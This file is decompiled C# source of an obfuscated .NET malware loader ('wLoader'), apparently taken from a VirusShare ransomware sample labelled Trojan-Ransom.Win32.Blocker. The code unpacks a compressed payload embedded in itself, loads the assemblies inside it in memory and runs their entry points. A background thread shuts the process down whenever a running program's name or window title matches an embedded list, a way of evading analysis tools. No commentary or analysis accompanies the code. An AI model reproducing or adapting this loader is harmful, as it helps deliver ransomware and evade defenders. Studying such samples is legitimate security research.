// Decompiled with JetBrains decompiler
// Type: ?11?
// Assembly: wLoader, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 601E9F23-A239-4CA4-BCF6-5BB65F85A0DA
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.biqw-00a129d49d9d6af2a869f53ab2db7d80f4313e2b391d30ed8e02a96f59aa0cb4.exe

using \u003F16\u003F;
using \u003F4\u003F;
using \u003F5\u003F;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading;

internal sealed class \u003F11\u003F
{
  public static \u003F11\u003F.\u003F2\u003F \u003F1\u003F;
  public static string[] \u003F2\u003F;
  public static MemoryStream[] \u003F3\u003F;
  public static string[] \u003F5\u003F;
  public static string[] \u003F4\u003F;
  public static bool \u003F6\u003F;
  [NonSerialized]
  internal static \u003F9\u003F \u003F26\u003F;

  static \u003F11\u003F()
  {
    \u003F2\u003F.\u003F8\u003F(typeof (\u003F11\u003F));
    \u003F11\u003F.\u003F6\u003F = false;
  }

  private static long \u003F1\u003F(Stream _param0)
  {
    long num1 = 0;
    if (false)
      return num1;
    long num2 = num1;
    int num3;
    for (int index = 0; index < 8; index = num3)
    {
      int num4 = _param0.ReadByte();
      long num5 = num2;
      long num6;
      while (true)
      {
        int num7 = num4;
        if (true)
          goto label_11;
label_1:
        long num8 = (long) (uint) num7;
        int num9 = 8;
        int num10 = index;
        int num11;
        int num12;
        while (true)
        {
          num11 = num9 * num10;
          num12 = 63;
          if (num12 == 0)
          {
            num10 = num12;
            num9 = num11;
          }
          else
            break;
        }
        int num13 = num11 & num12;
        long num14 = num8 << num13;
        num6 = num5 | num14;
        if (false)
        {
          num5 = num6;
          continue;
        }
        break;
label_11:
        num7 = (int) (byte) num7;
        goto label_1;
      }
      if (true)
        goto label_10;
label_3:
      num3 = index;
      if (false)
        continue;
      ++num3;
      continue;
label_10:
      num2 = num6;
      goto label_3;
    }
    return num2;
  }

  private static \u003F11\u003F.\u003F2\u003F \u003F1\u003F(MemoryStream _param0)
  {
    GCHandle gcHandle;
    \u003F11\u003F.\u003F2\u003F structure;
    do
    {
      if (false)
        goto label_3;
      else
        goto label_4;
label_1:
      if (true)
      {
        structure = (\u003F11\u003F.\u003F2\u003F) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u003F11\u003F.\u003F2\u003F));
        continue;
      }
label_2:
      byte[] buffer;
      _param0.Read(buffer, 0, Marshal.SizeOf(typeof (\u003F11\u003F.\u003F2\u003F)));
label_3:
      gcHandle = GCHandle.Alloc((object) buffer, GCHandleType.Pinned);
      goto label_1;
label_4:
      if (true)
      {
        buffer = new byte[Marshal.SizeOf(typeof (\u003F11\u003F.\u003F2\u003F))];
        goto label_2;
      }
      else
        goto label_1;
    }
    while (false);
    gcHandle.Free();
    return structure;
  }

  private static \u003F11\u003F.\u003F1\u003F \u003F1\u003F(
    MemoryStream _param0,
    int _param1,
    ref string _param2,
    ref MemoryStream _param3)
  {
    byte[] buffer1 = new byte[Marshal.SizeOf(typeof (\u003F11\u003F.\u003F1\u003F))];
    _param0.Seek((long) _param1, SeekOrigin.Begin);
    _param0.Read(buffer1, 0, Marshal.SizeOf(typeof (\u003F11\u003F.\u003F1\u003F)));
    GCHandle gcHandle = GCHandle.Alloc((object) buffer1, GCHandleType.Pinned);
    \u003F11\u003F.\u003F1\u003F structure = (\u003F11\u003F.\u003F1\u003F) Marshal.PtrToStructure(gcHandle.AddrOfPinnedObject(), typeof (\u003F11\u003F.\u003F1\u003F));
    gcHandle.Free();
    byte[] numArray = new byte[structure.\u003F5\u003F];
    _param0.Seek((long) structure.\u003F3\u003F, SeekOrigin.Begin);
    _param0.Read(numArray, 0, structure.\u003F5\u003F);
    _param2 = Encoding.UTF8.GetString(numArray);
    byte[] buffer2 = new byte[structure.\u003F2\u003F];
    _param0.Seek((long) structure.\u003F1\u003F, SeekOrigin.Begin);
    _param0.Read(buffer2, 0, structure.\u003F2\u003F);
    _param3.Write(buffer2, 0, structure.\u003F2\u003F);
    return structure;
  }

  private static string \u003F1\u003F(MemoryStream _param0, int _param1, int _param2)
  {
    if (true)
      goto label_3;
label_2:
    string str;
    return str;
label_3:
    int length = _param2;
    byte[] numArray;
    while (true)
    {
      numArray = new byte[length];
      _param0.Seek((long) _param1, SeekOrigin.Begin);
      int num = _param0.Read(numArray, 0, _param2);
      if (false)
        length = num;
      else if (false)
        length = num;
      else if (false)
        length = num;
      else
        break;
    }
    str = Encoding.UTF8.GetString(numArray);
    goto label_2;
  }

  private static Assembly \u003F1\u003F(object _param0, ResolveEventArgs _param1)
  {
    if (true)
      goto label_7;
label_1:
    int num1 = 1;
    int index;
    if (num1 != 0)
      index = num1;
    else
      goto label_8;
label_4:
    int num2 = index;
    int num3 = \u003F11\u003F.\u003F1\u003F.\u003F2\u003F;
    int num4 = num2;
    goto label_11;
label_7:
    string strB;
    if (true)
    {
      strB = new AssemblyName(_param1.Name).Name + \u003F11\u003F.\u003F26\u003F(131);
      goto label_1;
    }
    else
      goto label_4;
label_8:
    if (num1 == 0)
      return Assembly.Load(\u003F11\u003F.\u003F3\u003F[index].ToArray());
    num4 = index;
    num3 = 1;
    if (num3 != 0)
    {
      index = num4 + num3;
      goto label_4;
    }
label_11:
    if (num4 >= num3)
      return (Assembly) null;
    num1 = string.Compare(\u003F11\u003F.\u003F2\u003F[index], strB, true);
    goto label_8;
  }

  public static bool \u003F1\u003F(string _param0, string _param1)
  {
    switch (_param0)
    {
      case null:
        return false;
      default:
        if (_param0.Length != 0)
          return new Regex(_param1.Replace(\u003F11\u003F.\u003F26\u003F(140), \u003F11\u003F.\u003F26\u003F(145)).Replace(\u003F11\u003F.\u003F26\u003F(150), \u003F11\u003F.\u003F26\u003F(155)).Replace('?', '.').ToLower()).IsMatch(_param0.ToLower());
        goto case null;
    }
  }

  public static bool \u003F1\u003F(string _param0, string[] _param1)
  {
    string[] strArray = _param1;
    int num1 = 0;
    if (num1 == 0)
      goto label_6;
label_3:
    int index = num1;
label_4:
    int num2;
    int num3;
    while (index < strArray.Length)
    {
      string str = strArray[index];
      if (!\u003F11\u003F.\u003F1\u003F(_param0, str))
      {
        if (true)
        {
          num2 = index;
          goto label_2;
        }
      }
      else
      {
        num3 = true ? 1 : 0;
        goto label_5;
      }
    }
    goto label_10;
label_2:
    num1 = num2 + 1;
    goto label_3;
label_5:
    if (true)
      return num3 != 0;
    num2 = num3;
    goto label_2;
label_10:
    int num4 = 0;
    if (num4 == 0)
      return num4 != 0;
    num3 = num4;
    goto label_5;
label_6:
    index = num1;
    goto label_4;
  }

  public static void \u003F1\u003F()
  {
    Process.GetCurrentProcess().CloseMainWindow();
    Process.GetCurrentProcess().Close();
    Process.GetCurrentProcess().Kill();
  }

  public static void \u003F2\u003F()
  {
    while (!\u003F11\u003F.\u003F6\u003F)
    {
      Process[] processes = Process.GetProcesses();
      if (true)
        goto label_6;
label_3:
      int index;
      while (true)
      {
        if (true)
          goto label_12;
label_1:
        if (true)
          Thread.Sleep(100);
        else
          goto label_9;
label_2:
        ++index;
        continue;
label_9:
        if (\u003F11\u003F.\u003F1\u003F(processes[index].MainWindowTitle, \u003F11\u003F.\u003F4\u003F))
        {
          \u003F11\u003F.\u003F1\u003F();
          goto label_1;
        }
        else
          goto label_1;
label_12:
        if (true)
        {
          int num1 = index;
          int num2 = processes.Length;
          if (true)
            goto label_14;
label_4:
          int num3 = num2 - 1;
          if (num1 < num3)
          {
            if (\u003F11\u003F.\u003F1\u003F(processes[index].ProcessName, \u003F11\u003F.\u003F5\u003F))
            {
              \u003F11\u003F.\u003F1\u003F();
              goto label_9;
            }
            else
              goto label_9;
          }
          else
            break;
label_14:
          num2 = num2;
          goto label_4;
        }
        else
          goto label_2;
      }
      Thread.Sleep(1500);
      if (false)
        continue;
      continue;
label_6:
      index = 0;
      goto label_3;
    }
  }

  [STAThread]
  private static void \u003F1\u003F(string[] _param0)
  {
    MemoryStream memoryStream1 = new MemoryStream();
    MemoryStream memoryStream2 = new MemoryStream(\u003F2\u003F.\u003F1\u003F());
    MemoryStream memoryStream3;
    if (true)
      memoryStream3 = memoryStream2;
    memoryStream3.Seek(-8L, SeekOrigin.End);
    long num1 = \u003F11\u003F.\u003F1\u003F((Stream) memoryStream3);
    memoryStream3.Seek(-num1 - 8L, SeekOrigin.Current);
label_1:
    byte[] buffer = new byte[5];
    memoryStream3.Read(buffer, 0, 5);
    \u003F10\u003F obj = new \u003F10\u003F();
    obj.\u0001(buffer);
    long num2 = \u003F11\u003F.\u003F1\u003F((Stream) memoryStream3);
    obj.\u0001((Stream) memoryStream3, (Stream) memoryStream1, num1, num2, (\u003F8\u003F) null);
    memoryStream3.Close();
    memoryStream1.Seek(0L, SeekOrigin.Begin);
    \u003F11\u003F.\u003F1\u003F = \u003F11\u003F.\u003F1\u003F(memoryStream1);
    if (\u003F11\u003F.\u003F1\u003F.\u003F1\u003F)
      goto label_10;
label_2:
    \u003F11\u003F.\u003F2\u003F = new string[\u003F11\u003F.\u003F1\u003F.\u003F2\u003F];
    \u003F11\u003F.\u003F3\u003F = new MemoryStream[\u003F11\u003F.\u003F1\u003F.\u003F2\u003F];
    int num3 = Marshal.SizeOf(typeof (\u003F11\u003F.\u003F2\u003F));
    for (int index = 0; index < \u003F11\u003F.\u003F1\u003F.\u003F2\u003F; ++index)
    {
      \u003F11\u003F.\u003F2\u003F[index] = string.Empty;
      if (true)
      {
        \u003F11\u003F.\u003F3\u003F[index] = new MemoryStream();
        \u003F11\u003F.\u003F1\u003F(memoryStream1, num3, ref \u003F11\u003F.\u003F2\u003F[index], ref \u003F11\u003F.\u003F3\u003F[index]);
        num3 += Marshal.SizeOf(typeof (\u003F11\u003F.\u003F1\u003F));
      }
      else
        goto label_1;
    }
    if (\u003F11\u003F.\u003F1\u003F.\u003F2\u003F > 1)
      goto label_13;
label_5:
    Assembly assembly = Assembly.Load(\u003F11\u003F.\u003F3\u003F[0].ToArray());
    if ((object) assembly != null)
      goto label_14;
label_7:
    if (!\u003F11\u003F.\u003F1\u003F.\u003F1\u003F)
      return;
    \u003F11\u003F.\u003F6\u003F = \u003F11\u003F.\u003F1\u003F.\u003F1\u003F;
    return;
label_14:
    if (assembly.EntryPoint.GetParameters().Length != 0)
    {
      assembly.EntryPoint.Invoke((object) null, new object[1]
      {
        (object) _param0
      });
      goto label_7;
    }
    else
    {
      assembly.EntryPoint.Invoke((object) null, (object[]) null);
      goto label_7;
    }
label_13:
    // ISSUE: method pointer
    AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler((object) null, __methodptr(\u003F1\u003F));
    goto label_5;
label_10:
    \u003F11\u003F.\u003F5\u003F = \u003F11\u003F.\u003F1\u003F(memoryStream1, \u003F11\u003F.\u003F1\u003F.\u003F3\u003F, \u003F11\u003F.\u003F1\u003F.\u003F5\u003F).Split('|');
    \u003F11\u003F.\u003F4\u003F = \u003F11\u003F.\u003F1\u003F(memoryStream1, \u003F11\u003F.\u003F1\u003F.\u003F4\u003F, \u003F11\u003F.\u003F1\u003F.\u003F6\u003F).Split('|');
    new Thread(new ThreadStart(\u003F11\u003F.\u003F2\u003F)).Start();
    goto label_2;
  }

  public struct \u003F1\u003F
  {
    public int \u003F1\u003F;
    public int \u003F2\u003F;
    public int \u003F3\u003F;
    public int \u003F5\u003F;
  }

  public struct \u003F2\u003F
  {
    public bool \u003F1\u003F;
    public int \u003F2\u003F;
    public int \u003F3\u003F;
    public int \u003F5\u003F;
    public int \u003F4\u003F;
    public int \u003F6\u003F;
  }
}
